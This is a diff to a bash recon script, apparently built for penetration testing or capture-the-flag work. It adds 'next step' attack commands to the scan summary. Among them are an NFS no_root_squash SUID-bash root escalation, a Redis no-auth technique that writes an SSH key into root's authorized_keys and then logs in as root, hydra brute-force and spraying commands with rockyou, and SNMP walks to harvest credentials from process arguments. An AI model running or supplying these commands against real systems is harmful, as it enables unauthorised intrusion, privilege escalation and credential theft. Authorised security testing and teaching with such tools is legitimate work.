@@ -994,6 +994,10 @@ enum_ssh() {
             warn "  ★ Potentially vulnerable SSH version: $ssh_version"
             echo "POTENTIALLY VULNERABLE SSH: $ssh_version on $ip:$port" \
                 >> "$target_dir/loot/quick_wins.txt"
+            warn "  → Next steps for vulnerable SSH:"
+            warn "    searchsploit openssh $(echo "$ssh_version" | grep -oP 'OpenSSH_\K[0-9]+\.[0-9]+')"
+            warn "    ssh-audit $ip -p $port               # detailed vuln report"
+            warn "    ./crackr.sh --hydra ssh --target $ip  # if no creds yet"
         fi
     fi
 
@@ -1369,6 +1373,15 @@ enum_rpc() {
             success "  ★ NFS exports found on $ip ★"
             echo "NFS EXPORTS on $ip:" >> "$target_dir/loot/quick_wins.txt"
             grep -P '^\s*/' "$outdir/nfs_exports.txt" >> "$target_dir/loot/quick_wins.txt"
+            while IFS= read -r export_line; do
+                local export_path
+                export_path=$(echo "${export_line}" | awk '{print $1}')
+                [[ -z "${export_path}" ]] && continue
+                echo "NEXT: mkdir /mnt/nfs_${ip//\./_} && mount -t nfs ${ip}:${export_path} /mnt/nfs_${ip//\./_}" \
+                    >> "$target_dir/loot/quick_wins.txt"
+                echo "NEXT (no_root_squash): cp /bin/bash /mnt/nfs_${ip//\./_}/bash && chmod +s /mnt/nfs_${ip//\./_}/bash && /mnt/nfs_${ip//\./_}/bash -p" \
+                    >> "$target_dir/loot/quick_wins.txt"
+            done < <(grep -P '^\s*/' "$outdir/nfs_exports.txt" 2>/dev/null | head -3)
         fi
     fi
 
@@ -1415,6 +1428,10 @@ enum_ldap() {
             if (( entry_count > 0 )); then
                 success "  ★ LDAP anonymous bind: $entry_count entries found"
                 echo "LDAP anonymous bind on $ip: $entry_count entries" \
+                    >> "$target_dir/loot/quick_wins.txt"
+                echo "NEXT: ldapsearch -x -H ldap://${ip}:${port} -b '${base_dn}' '(objectClass=*)' | grep -iE 'sAMAccountName|mail|description|memberOf'" \
+                    >> "$target_dir/loot/quick_wins.txt"
+                echo "NEXT (if domain-joined): ./adr.sh -d <DOMAIN> -u '' -p '' -dc ${ip}" \
                     >> "$target_dir/loot/quick_wins.txt"
             fi
         fi
@@ -1689,6 +1706,30 @@ generate_summary() {
             if [[ -f "$target_dir/tcp/smb/smb_quick_findings.txt" ]]; then
                 while IFS= read -r line; do echo "  $line"; done < "$target_dir/tcp/smb/smb_quick_findings.txt"
             fi
+            # Next-step commands for readable shares
+            if grep -qiE 'READ|WRITE' "$target_dir/tcp/smb/smbmap_null.txt" 2>/dev/null || \
+               grep -qiE 'READ|WRITE' "$target_dir/tcp/smb/smbmap_guest.txt" 2>/dev/null; then
+                echo "  NEXT STEPS:"
+                echo "    smbmap -H $ip                         # list shares + permissions"
+                echo "    smbclient //$ip/<SHARE> -N            # browse anonymously"
+                echo "    smbclient //$ip/<SHARE> -N -c 'ls'    # list share contents"
+                echo "    mount -t cifs //$ip/<SHARE> /mnt -o guest  # mount anonymous"
+                echo "    # If creds available:"
+                echo "    smbmap -H $ip -u <USER> -p '<PASS>'   # with credentials"
+                echo "    smbclient //$ip/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'"
+            fi
+            # NFS next steps
+            if grep -qP '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null; then
+                echo "  NFS NEXT STEPS:"
+                while IFS= read -r export_line; do
+                    local export_path
+                    export_path=$(echo "${export_line}" | awk '{print $1}')
+                    [[ -z "${export_path}" ]] && continue
+                    echo "    showmount -e $ip"
+                    echo "    mkdir /mnt/nfs_${ip//\./_} && mount -t nfs $ip:${export_path} /mnt/nfs_${ip//\./_}"
+                    echo "    # If no_root_squash: cp /bin/bash /mnt/nfs_${ip//\./_}/bash && chmod +s /mnt/nfs_${ip//\./_}/bash"
+                done < <(grep -P '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null | head -3)
+            fi
             echo ""
         fi
 
@@ -1697,13 +1738,196 @@ generate_summary() {
             echo "═══ SNMP FINDINGS ════════════════════════════════════════"
             echo ""
             if [[ -f "$target_dir/udp/snmp/valid_community_strings.txt" ]]; then
-                echo "  Community strings: $(tr '\n' ',' < "$target_dir/udp/snmp/valid_community_strings.txt")"
+                local snmp_strings
+                snmp_strings=$(tr '\n' ',' < "$target_dir/udp/snmp/valid_community_strings.txt" | sed 's/,$//')
+                echo "  Community strings: ${snmp_strings}"
+                echo ""
+                echo "  NEXT STEPS:"
+                while IFS= read -r community; do
+                    [[ -z "${community}" ]] && continue
+                    echo "    snmpwalk -v2c -c '${community}' $ip                      # full walk"
+                    echo "    snmpwalk -v2c -c '${community}' $ip 1.3.6.1.2.1.25.4.2.1.5  # process args (creds!)"
+                done < "$target_dir/udp/snmp/valid_community_strings.txt"
             fi
             if [[ -f "$target_dir/udp/snmp/running_processes.txt" && -s "$target_dir/udp/snmp/running_processes.txt" ]]; then
-                echo "  Running processes: $(wc -l < "$target_dir/udp/snmp/running_processes.txt") entries"
+                echo "  Running processes: $(wc -l < "$target_dir/udp/snmp/running_processes.txt") entries — check $target_dir/udp/snmp/process_args.txt for embedded creds"
+            fi
+            if [[ -f "$target_dir/udp/snmp/process_args.txt" && -s "$target_dir/udp/snmp/process_args.txt" ]]; then
+                echo "  ★ process_args.txt present — grep for credentials:"
+                echo "    grep -iE 'pass|pwd|secret|key|token|cred|-p[[:space:]]' $target_dir/udp/snmp/process_args.txt"
             fi
             echo ""
         fi
+
+        # --- Next-Step Commands ---
+        echo "═══ ★ NEXT-STEP COMMANDS ★ ══════════════════════════════"
+        echo ""
+        local tcp_ports_found=""
+        [[ -f "$target_dir/scans/tcp_ports.txt" ]] && tcp_ports_found=$(cat "$target_dir/scans/tcp_ports.txt" 2>/dev/null)
+
+        # HTTP → webenum
+        if ls "$target_dir/tcp/http/port_"* &>/dev/null 2>&1; then
+            for httpdir in "$target_dir/tcp/http"/port_*; do
+                [[ -d "$httpdir" ]] || continue
+                local p
+                p=$(basename "$httpdir" | sed 's/port_//')
+                local proto_hint="http"
+                [[ "$p" == "443" || "$p" == "8443" ]] && proto_hint="https"
+                echo "  # HTTP on port $p — run deep web enumeration:"
+                echo "  ./webenum.sh --url ${proto_hint}://$ip:${p}"
+            done
+        fi
+
+        # SMB → adr.sh or manual
+        if [[ -d "$target_dir/tcp/smb" ]]; then
+            echo "  # SMB found — if domain-joined, run AD recon:"
+            echo "  ./adr.sh -d <DOMAIN> -u <USER> -p '<PASS>' -dc $ip"
+            echo "  # OR anonymous SMB access:"
+            echo "  smbmap -H $ip -u '' -p ''"
+        fi
+
+        # LDAP → adr.sh
+        if [[ -d "$target_dir/tcp/ldap" ]]; then
+            echo "  # LDAP found — anonymous bind test:"
+            echo "  ldapsearch -x -H ldap://$ip -s base namingContexts"
+            if [[ -s "$target_dir/tcp/ldap/naming_contexts.txt" ]]; then
+                local base_dn
+                base_dn=$(grep -oP 'namingContexts:\s*\K.*' "$target_dir/tcp/ldap/naming_contexts.txt" 2>/dev/null | head -1)
+                [[ -n "$base_dn" ]] && echo "  ldapsearch -x -H ldap://$ip -b '${base_dn}' '(objectClass=*)'"
+            fi
+            echo "  # If creds available: ./adr.sh -d <DOMAIN> -u <USER> -p '<PASS>' -dc $ip"
+        fi
+
+        # FTP → anonymous access
+        if [[ -f "$target_dir/tcp/ftp/ANONYMOUS_ACCESS.txt" ]]; then
+            echo "  # ANONYMOUS FTP ACCESS:"
+            echo "  ftp $ip                           # login: anonymous / anonymous@test.com"
+            echo "  wget -r --no-passive-ftp ftp://anonymous:anon@$ip/"
+        elif [[ -d "$target_dir/tcp/ftp" ]]; then
+            echo "  # FTP found — check $target_dir/tcp/ftp/anonymous_check.txt"
+        fi
+
+        # NFS
+        if grep -qP '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null; then
+            echo "  # NFS exports found:"
+            grep -P '^\s*/' "$target_dir/tcp/rpc/nfs_exports.txt" 2>/dev/null | while IFS= read -r exp; do
+                local ep
+                ep=$(echo "$exp" | awk '{print $1}')
+                echo "  mkdir /mnt/nfs && mount -t nfs $ip:${ep} /mnt/nfs"
+            done
+        fi
+
+        # MySQL
+        if grep -qi 'MySQL ROOT NO-PASSWORD\|MySQL EMPTY PASSWORD' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
+            echo "  # MySQL root no-password:"
+            echo "  mysql -h $ip -u root --password='' -e 'show databases; select user,host,password from mysql.user;'"
+        elif [[ -d "$target_dir/tcp/mysql" ]]; then
+            echo "  # MySQL found:"
+            echo "  mysql -h $ip -u root --password=''   # try blank password"
+            echo "  mysql -h $ip -u root                 # try no password flag"
+            echo "  # No blank creds — brute-force:"
+            echo "  ./crackr.sh --hydra mysql --target $ip -u root -P /usr/share/wordlists/rockyou.txt"
+        fi
+
+        # PostgreSQL
+        if grep -qi 'PostgreSQL LOGIN' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
+            echo "  # PostgreSQL login found — check quick_wins.txt for creds"
+            echo "  psql -h $ip -U postgres -c '\l'"
+        elif [[ -d "$target_dir/tcp/postgres" ]]; then
+            echo "  # PostgreSQL found:"
+            echo "  psql -h $ip -U postgres             # try default creds"
+            echo "  PGPASSWORD=postgres psql -h $ip -U postgres -c '\l'"
+            echo "  # No blank creds — brute-force:"
+            echo "  ./crackr.sh --hydra postgres --target $ip -u postgres -P /usr/share/wordlists/rockyou.txt"
+        fi
+
+        # SMTP
+        if [[ -d "$target_dir/tcp/smtp" ]]; then
+            local vrfy_file="$target_dir/tcp/smtp/vrfy_users.txt"
+            if grep -qi 'valid user\|^VALID:' "$vrfy_file" 2>/dev/null; then
+                # Save valid usernames to a stable loot file
+                local smtp_users_loot="$target_dir/loot/smtp_valid_users.txt"
+                grep -oP '^VALID:\s*\K\S+' "$vrfy_file" 2>/dev/null > "$smtp_users_loot" || true
+                local smtp_ucount
+                smtp_ucount=$(wc -l < "$smtp_users_loot" 2>/dev/null); smtp_ucount=${smtp_ucount:-0}
+                echo "  # SMTP valid users ($smtp_ucount) saved → $smtp_users_loot"
+                echo "  cat $smtp_users_loot"
+                echo "  # Spray via SMB/WinRM with these users:"
+                echo "  ./sprayr.sh -U $smtp_users_loot -p 'Password1' -t $ip"
+                echo "  # Brute-force SSH with discovered usernames:"
+                echo "  ./crackr.sh --hydra ssh --target $ip -U $smtp_users_loot -P /usr/share/wordlists/rockyou.txt"
+                echo "  # Brute-force SMTP auth:"
+                echo "  ./crackr.sh --hydra smtp --target $ip -U $smtp_users_loot -P /usr/share/wordlists/rockyou.txt"
+            fi
+            echo "  # SMTP user enum (if not yet done):"
+            echo "  smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $ip"
+        fi
+
+        # Redis
+        if grep -qi 'REDIS NO-AUTH' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
+            echo "  # Redis no-auth — full access:"
+            echo "  redis-cli -h $ip KEYS '*'"
+            echo "  redis-cli -h $ip CONFIG GET '*'"
+            echo "  # Write SSH key (if Redis runs as root and ~/.ssh/authorized_keys is writable):"
+            echo "  redis-cli -h $ip CONFIG SET dir /root/.ssh"
+            echo "  redis-cli -h $ip CONFIG SET dbfilename authorized_keys"
+            echo "  redis-cli -h $ip SET payload \"\$(cat ~/.ssh/id_rsa.pub)\""
+            echo "  redis-cli -h $ip BGSAVE"
+            echo "  # After BGSAVE — wait 2s then SSH as root:"
+            echo "  sleep 2 && ssh -i ~/.ssh/id_rsa root@$ip"
+        fi
+
+        # VHosts
+        local vhost_json="$target_dir/tcp/http/port_80/ffuf_vhosts.json"
+        [[ ! -f "$vhost_json" ]] && vhost_json=$(find "$target_dir/tcp/http" -name 'ffuf_vhosts.json' 2>/dev/null | head -1)
+        if [[ -f "$vhost_json" ]]; then
+            local vhosts
+            vhosts=$(jq -r '.results[].host // .results[].input.VHOST // empty' "$vhost_json" 2>/dev/null \
+                | grep -v '^$' | sort -u)
+            if [[ -n "$vhosts" ]]; then
+                echo "  # VHosts found — add each to /etc/hosts then enumerate:"
+                while IFS= read -r vhost; do
+                    echo "  echo '$ip $vhost' | sudo tee -a /etc/hosts"
+                    echo "  ./webenum.sh --url http://$vhost"
+                done <<< "$vhosts"
+            fi
+        elif grep -qi 'VHOSTS found' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
+            echo "  # VHosts detected — parse $target_dir/tcp/http/port_*/ffuf_vhosts.json"
+            echo "  # jq -r '.results[].host' <json_file>"
+            echo "  # Then: echo '$ip <vhost>' | sudo tee -a /etc/hosts && ./webenum.sh --url http://<vhost>"
+        fi
+
+        # DNS zone transfer
+        if grep -qi 'ZONE TRANSFER' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
+            echo "  # DNS zone transfer successful — extract hostnames and add to /etc/hosts:"
+            local zt_file
+            zt_file=$(find "$target_dir/tcp/dns" -name 'zone_transfer_*.txt' 2>/dev/null | head -1)
+            if [[ -f "$zt_file" ]]; then
+                echo "  # Hostnames from zone transfer:"
+                awk '/^[^;]/ && $4 ~ /^A$/ {print $1}' "$zt_file" 2>/dev/null | sed 's/\.$//' \
+                    | while IFS= read -r host; do
+                        echo "  echo '$ip $host' | sudo tee -a /etc/hosts"
+                    done
+                echo "  # See full zone: cat $zt_file"
+            else
+                echo "  # see $target_dir/tcp/dns/"
+            fi
+        elif [[ -d "$target_dir/tcp/dns" ]]; then
+            echo "  # DNS found — try zone transfer:"
+            echo "  dig @$ip <DOMAIN> axfr"
+        fi
+
+        # WinRM
+        if echo "${tcp_ports_found}" | grep -qE '5985|5986'; then
+            echo "  # WinRM found:"
+            echo "  evil-winrm -i $ip -u <USER> -p '<PASS>'"
+            echo "  evil-winrm -i $ip -u <USER> -H '<NTLM_HASH>'"
+            echo "  # No creds yet? Brute-force WinRM:"
+            echo "  ./crackr.sh --hydra winrm --target $ip -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt"
+            echo "  # Or spray known users: ./sprayr.sh --from-creds -t $ip"
+        fi
+
+        echo ""
 
         # --- Completion Status ---
         echo "═══ SCAN STATUS ═══════════════════════════════════════════"
